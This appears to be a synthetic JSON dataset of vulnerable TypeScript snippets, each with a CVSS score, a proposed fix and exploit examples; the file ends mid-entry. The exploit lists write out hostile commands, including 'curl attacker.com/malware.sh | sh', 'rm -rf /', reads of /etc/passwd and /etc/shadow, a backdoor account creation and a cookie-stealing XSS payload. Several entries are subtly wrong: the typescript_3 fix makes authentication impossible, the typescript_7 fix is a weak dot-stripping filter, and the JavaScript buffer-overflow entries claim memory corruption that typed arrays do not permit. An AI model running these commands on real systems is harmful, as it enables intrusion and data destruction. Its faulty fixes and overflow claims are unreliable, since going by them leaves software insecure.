{
    "typescript_0": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "const { exec } = require('child_process');\n\nfunction escalatePrivileges(command) {\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        console.log(`Command output:\\n${stdout}`);\n    });\n}\n\n// Example usage:\nescalatePrivileges(process.argv[2]);",
        "cvss_score": 8.5,
        "fixed_code": "const { exec } = require('child_process');\n\nfunction escalatePrivileges(command) {\n    const allowedCommands = ['whoami', 'ls'];\n    if (!allowedCommands.includes(command)) {\n        console.error('Command not allowed.');\n        return;\n    }\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        console.log(`Command output:\\n${stdout}`);\n    });\n}\n\n// Example usage:\nescalatePrivileges(process.argv[2]);",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files.",
            "Could use 'usermod -aG sudo username' to add a user to the sudo group.",
            "Can chain commands like 'whoami; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "typescript_1": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "const { exec } = require('child_process');\n\nfunction runCommand(command) {\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Stderr: ${stderr}`);\n            return;\n        }\n        console.log(`Stdout: ${stdout}`);\n    });\n}\n\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "cvss_score": 8.5,
        "fixed_code": "const { exec } = require('child_process');\n\nfunction runAllowedCommand(command) {\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error: ${error.message}`);\n                return;\n            }\n            if (stderr) {\n                console.error(`Stderr: ${stderr}`);\n                return;\n            }\n            console.log(`Stdout: ${stdout}`);\n        });\n    } else {\n        console.error('Command not allowed');\n    }\n}\n\nconst userInput = process.argv[2];\nrunAllowedCommand(userInput);",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "typescript_2": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "class User {\n    constructor(data) {\n        Object.assign(this, data);\n    }\n}\n\nfunction deserializeUser(serializedData) {\n    return new User(JSON.parse(serializedData));\n}",
        "cvss_score": 7.5,
        "fixed_code": "class User {\n    constructor(data) {\n        if (typeof data === 'object' && data !== null) {\n            Object.assign(this, data);\n        } else {\n            throw new Error('Invalid data type');\n        }\n    }\n}\n\nfunction deserializeUser(serializedData) {\n    try {\n        const parsedData = JSON.parse(serializedData);\n        if (typeof parsedData === 'object' && parsedData !== null) {\n            return new User(parsedData);\n        } else {\n            throw new Error('Invalid data format');\n        }\n    } catch (e) {\n        throw new Error('Failed to deserialize user: ' + e.message);\n    }\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON that replaces the User object with a prototype polluting payload.",
            "Could craft a serialized input to execute arbitrary code if the application improperly handles deserialized objects.",
            "Injecting specially crafted data could lead to denial of service by causing excessive resource consumption."
        ]
    },
    "typescript_3": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class AuthService {\\n    private static readonly SECRET_KEY = \"supersecretkey\";\\n    private token: string | null = null;\\n\\n    authenticate(password: string): boolean {\\n        const hash = this.hashPassword(password);\\n        if (hash === AuthService.SECRET_KEY) {\\n            this.token = this.generateToken();\\n            return true;\\n        }\\n        return false;\\n    }\\n\\n    private hashPassword(password: string): string {\\n        // Simple hashing logic for demonstration purposes\\n        let hash = 0;\\n        if (password.length === 0) return String(hash);\\n        for (let i = 0; i < password.length; i++) {\\n            const char = password.charCodeAt(i);\\n            hash = ((hash << 5) - hash) + char;\\n            hash |= 0; // Convert to 32bit integer\\n        }\\n        return String(hash);\\n    }\\n\\n    private generateToken(): string {\\n        return \"token_\" + Math.random().toString(36).substr(2, 9);\\n    }\\n\\n    getToken(): string | null {\\n        return this.token;\\n    }\\n}",
        "cvss_score": 8.5,
        "fixed_code": "class AuthService {\\n    private static readonly SECRET_KEY = \"supersecretkey\";\\n    private token: string | null = null;\\n\\n    authenticate(password: string): boolean {\\n        const hash = this.hashPassword(password);\\n        if (hash === AuthService.SECRET_KEY) {\\n            this.token = this.generateToken();\\n            return true;\\n        }\\n        return false;\\n    }\\n\\n    private hashPassword(password: string): string {\\n        const crypto = require('crypto');\\n        return crypto.createHash('sha256').update(password).digest('hex');\\n    }\\n\\n    private generateToken(): string {\\n        const jwt = require('jsonwebtoken');\\n        return jwt.sign({ user: 'admin' }, AuthService.SECRET_KEY, { expiresIn: '1h' });\\n    }\\n\\n    getToken(): string | null {\\n        return this.token;\\n    }\\n}",
        "exploit_ways": [
            "An attacker can use brute force to find the correct password hash.",
            "If the SECRET_KEY is compromised, an attacker can generate valid tokens.",
            "Using common weak passwords or default credentials could lead to unauthorized access."
        ]
    },
    "typescript_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "const express = require('express');\nconst { exec } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/run', (req, res) => {\n    const command = req.body.cmd;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "cvss_score": 8.2,
        "fixed_code": "const express = require('express');\nconst { execFile } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst allowedCommands = ['ls', 'whoami'];\n\napp.post('/run', (req, res) => {\n    const command = req.body.cmd;\n    if (!allowedCommands.includes(command)) {\n        res.send('Command not allowed');\n        return;\n    }\n    execFile(command, [], (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; cat /etc/passwd' to leak sensitive information.",
            "Possible to execute remote commands like '; curl attacker.com/malware.sh | sh'."
        ]
    },
    "typescript_5": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\\n    private filePath: string;\\n\\n    constructor(path: string) {\\n        this.filePath = path;\\n    }\\n\\n    public readFile(): string {\\n        const fs = require('fs');\\n        return fs.readFileSync(this.filePath, 'utf8');\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\\n    private basePath: string;\\n    private filePath: string;\\n\\n    constructor(basePath: string, path: string) {\\n        this.basePath = basePath;\\n        this.filePath = path;\\n    }\\n\\n    public readFile(): string {\\n        const fs = require('fs');\\n        const resolvedPath = require('path').resolve(this.basePath, this.filePath);\\n        if (!resolvedPath.startsWith(this.basePath)) {\\n            throw new Error('Invalid file path');\\n        }\\n        return fs.readFileSync(resolvedPath, 'utf8');\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '../..' to traverse directories and access files outside the intended directory.",
            "Could use URL-encoded sequences like '..%2f' to bypass simple filters and navigate up the directory tree.",
            "By providing a crafted path, an attacker might be able to read sensitive configuration or log files."
        ]
    },
    "typescript_6": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/transfer', (req, res) => {\n    const { toAccount, amount } = req.body;\n    // Simulate transferring funds without CSRF protection\n    console.log(`Transferring ${amount} to account ${toAccount}`);\n    res.send('Transfer successful');\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 7.5,
        "fixed_code": "const express = require('express');\nconst csrf = require('csurf');\nconst app = express();\napp.use(express.json());\nconst csrfProtection = csrf({ cookie: true });\n\napp.post('/transfer', csrfProtection, (req, res) => {\n    const { toAccount, amount } = req.body;\n    // Simulate transferring funds with CSRF protection\n    console.log(`Transferring ${amount} to account ${toAccount}`);\n    res.send('Transfer successful');\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker could trick a logged-in user to visit a malicious website that sends a POST request to the /transfer endpoint.",
            "By using social engineering tactics, attackers can get users to click on links that execute CSRF attacks without their knowledge.",
            "Attackers can embed malicious scripts in iframes or images on other sites that target the vulnerable application."
        ]
    },
    "typescript_7": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\n    private filePath: string;\n\n    constructor(path: string) {\n        this.filePath = path;\n    }\n\n    public readFile(): string {\n        const fs = require('fs');\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\n    private basePath: string;\n    private filePath: string;\n\n    constructor(basePath: string, path: string) {\n        this.basePath = basePath;\n        this.filePath = this.sanitizePath(path);\n    }\n\n    private sanitizePath(path: string): string {\n        return path.replace(/\\.{2,}/g, '');\n    }\n\n    public readFile(): string {\n        const fs = require('fs');\n        const fullPath = this.basePath + '/' + this.filePath;\n        return fs.readFileSync(fullPath, 'utf8');\n    }\n}",
        "exploit_ways": [
            "An attacker could input '../etc/passwd' to read the system's passwd file.",
            "They can use '../../secrets.txt' to access sensitive files outside the intended directory.",
            "Input like '../../../../flag.txt' could reveal important flags or credentials."
        ]
    },
    "typescript_8": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "function transferFunds(recipientId: string, amount: number) {\n    const url = `https://api.example.com/transfer?recipient=${encodeURIComponent(recipientId)}&amount=${encodeURIComponent(amount.toString())}`;\n    fetch(url, { method: 'POST' });\n}",
        "cvss_score": 7.5,
        "fixed_code": "function transferFunds(recipientId: string, amount: number) {\n    const url = `https://api.example.com/transfer?recipient=${encodeURIComponent(recipientId)}&amount=${encodeURIComponent(amount.toString())}`;\n    fetch(url, { \n        method: 'POST',\n        headers: {\n            'X-CSRF-Token': getCSRFToken()\n        }\n    });\n}\n\nfunction getCSRFToken(): string {\n    // Implementation to retrieve CSRF token from cookie or local storage\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link that sends a POST request to the transfer endpoint, causing an unauthorized fund transfer.",
            "A compromised website could embed a form and automatically submit it using JavaScript when the user visits, exploiting the lack of CSRF protection.",
            "Attackers can use social engineering tactics to get users to visit a crafted page containing an auto-submitting form targeting the vulnerable transfer function."
        ]
    },
    "typescript_9": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "function processData(data: string): void {\n    const buffer = new ArrayBuffer(10);\n    const view = new DataView(buffer);\n    for (let i = 0; i < data.length; i++) {\n        view.setUint8(i, data.charCodeAt(i));\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "function processData(data: string): void {\n    const maxLength = 10;\n    if (data.length > maxLength) {\n        throw new Error(\"Data exceeds buffer length\");\n    }\n    const buffer = new ArrayBuffer(maxLength);\n    const view = new DataView(buffer);\n    for (let i = 0; i < data.length; i++) {\n        view.setUint8(i, data.charCodeAt(i));\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 10 characters to overwrite adjacent memory.",
            "Could inject malicious code into the buffer that gets executed if the program uses this buffer for control flow decisions.",
            "By providing a carefully crafted input, an attacker might be able to corrupt the heap and execute arbitrary code."
        ]
    },
    "typescript_10": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "class BufferHandler {\\n    private buffer: Uint8Array;\\n\\n    constructor(size: number) {\\n        this.buffer = new Uint8Array(size);\\n    }\\n\\n    write(data: Uint8Array, offset: number): void {\\n        for (let i = 0; i < data.length; i++) {\\n            this.buffer[offset + i] = data[i];\\n        }\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class BufferHandler {\\n    private buffer: Uint8Array;\\n\\n    constructor(size: number) {\\n        this.buffer = new Uint8Array(size);\\n    }\\n\\n    write(data: Uint8Array, offset: number): void {\\n        if (offset < 0 || data.length + offset > this.buffer.length) {\\n            throw new Error('Buffer overflow detected');\\n        }\\n        for (let i = 0; i < data.length; i++) {\\n            this.buffer[offset + i] = data[i];\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker could write beyond the allocated buffer size to overwrite adjacent memory.",
            "By carefully crafting input, an attacker can execute arbitrary code through overwritten return addresses.",
            "Exploiting this vulnerability can lead to denial of service by crashing the application."
        ]
    },
    "typescript_11": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import * as exec from 'child_process';\n\nconst express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/execute', (req, res) => {\n    const command = req.body.command;\n    if (command) {\n        exec.exec(command, (error, stdout, stderr) => {\n            if (error) {\n                res.status(500).send(`Error executing command: ${stderr}`);\n                return;\n            }\n            res.send(stdout);\n        });\n    } else {\n        res.status(400).send('No command provided');\n    }\n});\n\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT, () => {\n    console.log(`Server is running on port ${PORT}`);\n});",
        "cvss_score": 9.8,
        "fixed_code": "import * as exec from 'child_process';\n\nconst express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst allowedCommands = ['ls', 'whoami'];\n\napp.post('/execute', (req, res) => {\n    const command = req.body.command;\n    if (!command || !allowedCommands.includes(command)) {\n        res.status(400).send('Command not allowed');\n        return;\n    }\n    exec.exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.status(500).send(`Error executing command: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT, () => {\n    console.log(`Server is running on port ${PORT}`);\n});",
        "exploit_ways": [
            "An attacker could send a POST request with 'command': 'rm -rf /' to delete all files.",
            "They could execute 'curl http://attacker.com/malware.sh | sh' to download and run malicious code.",
            "By chaining commands like 'ls; cat /etc/passwd', an attacker can leak sensitive system information."
        ]
    },
    "typescript_13": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "class CommandExecutor {\n    execute(command: string): void {\n        require('child_process').exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "class CommandExecutor {\n    execute(command: string): void {\n        const allowedCommands = ['ls', 'whoami'];\n        if (!allowedCommands.includes(command)) {\n            console.error('Command not allowed');\n            return;\n        }\n        require('child_process').exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "typescript_14": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "function unsafeDeserialize(inputString) {\n    const payload = JSON.parse(inputString);\n    return payload;\n}",
        "cvss_score": 7.5,
        "fixed_code": "function safeDeserialize(inputString) {\n    try {\n        const payload = JSON.parse(inputString);\n        // Validate and sanitize the payload as needed\n        if (typeof payload === 'object' && !Array.isArray(payload) && payload !== null) {\n            return payload;\n        } else {\n            throw new Error('Invalid payload format');\n        }\n    } catch (e) {\n        console.error('Deserialization error:', e);\n        return null;\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a JSON object that, when deserialized, executes arbitrary code if the application improperly handles objects.",
            "By sending a maliciously crafted JSON string, an attacker could manipulate the application state to perform unauthorized actions.",
            "Using polymorphic payloads, attackers can bypass simple validation checks and execute unintended functionality in the application."
        ]
    },
    "typescript_15": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "class UserInterface {\\n    renderUserInput(input: string): void {\\n        const element = document.getElementById(\"userContent\");\\n        if (element) {\\n            element.innerHTML = input;\\n        }\\n    }\\n}",
        "cvss_score": 8.6,
        "fixed_code": "class UserInterface {\\n    renderUserInput(input: string): void {\\n        const element = document.getElementById(\"userContent\");\\n        if (element) {\\n            const textNode = document.createTextNode(input);\\n            element.appendChild(textNode);\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker can inject a script like '<script>alert(\\'XSS\\')</script>' to trigger popups.",
            "They can use '<img src=x onerror=alert(document.cookie)>' to steal cookies.",
            "Input like '<a href=javascript:alert(\"XSS\")>Click me</a>' can lead to phishing attacks."
        ]
    },
    "typescript_16": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import { exec } from 'child_process';\nfunction runCommand(cmd: string) {\n    exec(cmd, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Command error output: ${stderr}`);\n            return;\n        }\n        console.log(stdout);\n    });\n}\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "cvss_score": 7.8,
        "fixed_code": "import { exec } from 'child_process';\nfunction runCommand(cmd: string) {\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(cmd)) {\n        exec(cmd, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            if (stderr) {\n                console.error(`Command error output: ${stderr}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    } else {\n        console.error('Command not allowed');\n    }\n}\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files on the system.",
            "Could use 'useradd -m -s /bin/bash attacker && echo \"attacker:password\" | sudo chpasswd' to create a new user with full privileges.",
            "Chain commands like 'whoami; cat /etc/shadow' to escalate and extract sensitive information."
        ]
    },
    "typescript_17": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import * as express from 'express';\nconst app = express();\napp.use(express.json());\n\napp.post('/data', (req, res) => {\n    const data = JSON.parse(req.body.data);\n    res.send(data);\n});",
        "cvss_score": 7.5,
        "fixed_code": "import * as express from 'express';\nconst app = express();\napp.use(express.json());\n\napp.post('/data', (req, res) => {\n    try {\n        const data = JSON.parse(req.body.data);\n        if (typeof data !== 'object' || Array.isArray(data)) {\n            throw new Error('Invalid data format');\n        }\n        res.send(data);\n    } catch (error) {\n        res.status(400).send('Bad Request');\n    }\n});",
        "exploit_ways": [
            "An attacker can send malicious JSON payloads to execute arbitrary code on the server.",
            "By crafting specific input, an attacker might cause a Denial of Service (DoS) condition by crashing the server.",
            "The vulnerability could be leveraged to perform privilege escalation if the deserialized data leads to unauthorized actions."
        ]
    },
    "typescript_18": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "function executeCommand(command: string) {\n    const { exec } = require('child_process');\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error}`);\n            return;\n        }\n        console.log(stdout);\n    });\n}",
        "cvss_score": 8.2,
        "fixed_code": "function executeCommand(command: string) {\n    const { exec } = require('child_process');\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error}`);\n                return;\n            }\n            console.log(stdout);\n        });\n    } else {\n        console.log('Command not allowed');\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "typescript_19": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "const { exec } = require('child_process');\n\nfunction runCommand(command) {\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        console.log(stdout || stderr);\n    });\n}\n\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "cvss_score": 8.2,
        "fixed_code": "const { exec } = require('child_process');\n\nfunction runCommand(command) {\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            console.log(stdout || stderr);\n        });\n    } else {\n        console.log('Command not allowed');\n    }\n}\n\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; cat /etc/passwd' to leak sensitive files.",
            "Could chain commands like 'whoami; sudo su' to escalate privileges."
        ]
    },
    "typescript_20": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "\"use strict\";\nimport * as express from 'express';\nconst app = express();\n\napp.use(express.json());\n\ninterface User {\n    username: string;\n    passwordHash: string;\n}\n\nconst users: User[] = [\n    { username: 'admin', passwordHash: '$2a$10$sYlNiC8b7jGwZV92FvHuoOQZJ6.5X1U3LzTcDkx7t3M1JmPZ3L4B.', }, // hashed 'password'\n];\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n\n    if (!user) {\n        return res.status(401).send('Invalid credentials');\n    }\n\n    // Simulating a time-consuming hash comparison to avoid timing attacks\n    setTimeout(() => {\n        if (password === 'password') { // Insecure plain text password check\n            res.send('Login successful');\n        } else {\n            res.status(401).send('Invalid credentials');\n        }\n    }, 150);\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "cvss_score": 7.2,
        "fixed_code": "\"use strict\";\nimport * as express from 'express';\nconst app = express();\nimport * as bcrypt from 'bcrypt';\n\napp.use(express.json());\n\ninterface User {\n    username: string;\n    passwordHash: string;\n}\n\nconst users: User[] = [\n    { username: 'admin', passwordHash: '$2a$10$sYlNiC8b7jGwZV92FvHuoOQZJ6.5X1U3LzTcDkx7t3M1JmPZ3L4B.', }, // hashed 'password'\n];\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n\n    if (!user) {\n        return res.status(401).send('Invalid credentials');\n    }\n\n    bcrypt.compare(password, user.passwordHash, (err, result) => {\n        if (result) {\n            res.send('Login successful');\n        } else {\n            res.status(401).send('Invalid credentials');\n        }\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can brute force the login by repeatedly trying different passwords.",
            "The fixed delay for response may be used to infer if a username exists based on timing.",
            "If the server or application logs input, an attacker could potentially use this to gather information."
        ]
    },
    "typescript_21": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "\"use strict\";\nimport * as fs from 'fs';\nimport * as path from 'path';\n\nconst express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/file', (req, res) => {\n    const filePath = req.body.filePath;\n    const resolvedPath = path.resolve(filePath);\n    if (!resolvedPath.startsWith(process.cwd())) {\n        return res.status(403).send('Forbidden');\n    }\n    fs.readFile(resolvedPath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send(err);\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 7.5,
        "fixed_code": "\"use strict\";\nimport * as fs from 'fs';\nimport * as path from 'path';\n\nconst express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/file', (req, res) => {\n    const filePath = req.body.filePath;\n    const safePath = path.join(process.cwd(), 'files', path.basename(filePath));\n    fs.readFile(safePath, 'utf8', (err, data) => {\n        if (err) {\n            return res.status(500).send(err);\n        }\n        res.send(data);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "They can use relative paths like '../../secret.txt' to access sensitive files outside the intended directory.",
            "Crafting a request with 'filePath=/etc/shadow' could lead to leakage of hashed passwords."
        ]
    },
    "typescript_22": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import * as fs from 'fs';\n\nfunction readFile(filePath: string): void {\n    const data = fs.readFileSync(filePath, 'utf8');\n    console.log(data);\n}",
        "cvss_score": 7.5,
        "fixed_code": "import * as path from 'path';\nimport * as fs from 'fs';\n\nconst baseDir = path.resolve(__dirname, 'safe_directory');\n\nfunction readFile(filePath: string): void {\n    const resolvedPath = path.resolve(baseDir, filePath);\n    if (!resolvedPath.startsWith(baseDir)) {\n        throw new Error('Invalid file path');\n    }\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n    console.log(data);\n}",
        "exploit_ways": [
            "An attacker could use '../' to navigate to parent directories and read sensitive files.",
            "By providing a carefully crafted path, an attacker might access configuration files or source code.",
            "Using absolute paths, an attacker can target system-critical files such as /etc/passwd."
        ]
    },
    "typescript_23": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "function executeCommand(command: string): void {\n    const { exec } = require('child_process');\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Command output error: ${stderr}`);\n            return;\n        }\n        console.log(`Command output: ${stdout}`);\n    });\n}",
        "cvss_score": 9.1,
        "fixed_code": "function executeCommand(command: string): void {\n    const { exec } = require('child_process');\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error executing command: ${error.message}`);\n                return;\n            }\n            if (stderr) {\n                console.error(`Command output error: ${stderr}`);\n                return;\n            }\n            console.log(`Command output: ${stdout}`);\n        });\n    } else {\n        console.error('Command not allowed');\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the server.",
            "They can use 'curl http://attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Chaining commands like 'ls; cat /etc/passwd' can leak sensitive system information."
        ]
    },
    "typescript_24": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "function unsafeDeserialize(data: string) {\n    const parsedData = JSON.parse(data);\n    if (parsedData.type === 'user') {\n        return new User(parsedData.name, parsedData.id);\n    }\n    throw new Error('Invalid type');\n}",
        "cvss_score": 7.5,
        "fixed_code": "function safeDeserialize(data: string) {\n    let parsedData;\n    try {\n        parsedData = JSON.parse(data);\n    } catch (e) {\n        throw new Error('Invalid data format');\n    }\n    if (!parsedData.type || !['user'].includes(parsedData.type)) {\n        throw new Error('Invalid type');\n    }\n    if (typeof parsedData.name !== 'string' || typeof parsedData.id !== 'number') {\n        throw new Error('Invalid data types');\n    }\n    return new User(parsedData.name, parsedData.id);\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON to instantiate unintended objects.",
            "Could send a crafted JSON payload that leads to prototype pollution.",
            "Can exploit the vulnerability to execute arbitrary code if combined with other vulnerabilities."
        ]
    },
    "typescript_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "\"use strict\";\nclass UserInfo {\n    private username: string;\n    private password: string;\n\n    constructor(username: string, password: string) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public displayInfo() {\n        console.log(`Username: ${this.username}, Password: ${this.password}`);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "\"use strict\";\nclass UserInfo {\n    private username: string;\n    private password: string;\n\n    constructor(username: string, password: string) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public displayInfo() {\n        console.log(`Username: ${this.username}`);\n    }\n}",
        "exploit_ways": [
            "An attacker could view the logged information in the browser's console to obtain passwords.",
            "By accessing the developer tools, an attacker can invoke the displayInfo method directly on an instance to retrieve sensitive data.",
            "If this code is part of a larger application with improper logging or error handling, password data might be inadvertently exposed through logs."
        ]
    },
    "typescript_26": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "class HttpResponseHandler {\n    private headers: { [key: string]: string } = {};\n\n    addHeader(name: string, value: string): void {\n        this.headers[name] = value;\n    }\n\n    getResponse(): string {\n        let response = \"HTTP/1.1 200 OK\\r\\n\";\n        for (const header in this.headers) {\n            if (this.headers.hasOwnProperty(header)) {\n                response += `${header}: ${this.headers[header]}\\r\\n`;\n            }\n        }\n        response += \"\\r\\n\";\n        return response;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class HttpResponseHandler {\n    private headers: { [key: string]: string } = {};\n\n    addHeader(name: string, value: string): void {\n        // Validate and sanitize header name and value\n        if (!/^[A-Za-z0-9-]+$/.test(name) || /\\r\\n|\\n/.test(value)) {\n            throw new Error('Invalid header name or value');\n        }\n        this.headers[name] = value;\n    }\n\n    getResponse(): string {\n        let response = \"HTTP/1.1 200 OK\\r\\n\";\n        for (const header in this.headers) {\n            if (this.headers.hasOwnProperty(header)) {\n                response += `${header}: ${this.headers[header]}\\r\\n`;\n            }\n        }\n        response += \"\\r\\n\";\n        return response;\n    }\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: evil=true' to manipulate cookies.",
            "By inserting '\\r\\nLocation: http://malicious.com', an attacker could perform open redirection attacks.",
            "Injecting '\\r\\nContent-Length: 0\\r\\nConnection: close' could cause the server to truncate responses."
        ]
    },
    "typescript_27": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "\"use strict\";\nclass ResourceHandler {\n    private resource: number = 0;\n\n    public increment(): void {\n        setTimeout(() => {\n            this.resource++;\n        }, Math.random() * 100);\n    }\n\n    public decrement(): void {\n        setTimeout(() => {\n            this.resource--;\n        }, Math.random() * 100);\n    }\n\n    public getResource(): number {\n        return this.resource;\n    }\n}",
        "cvss_score": 5.3,
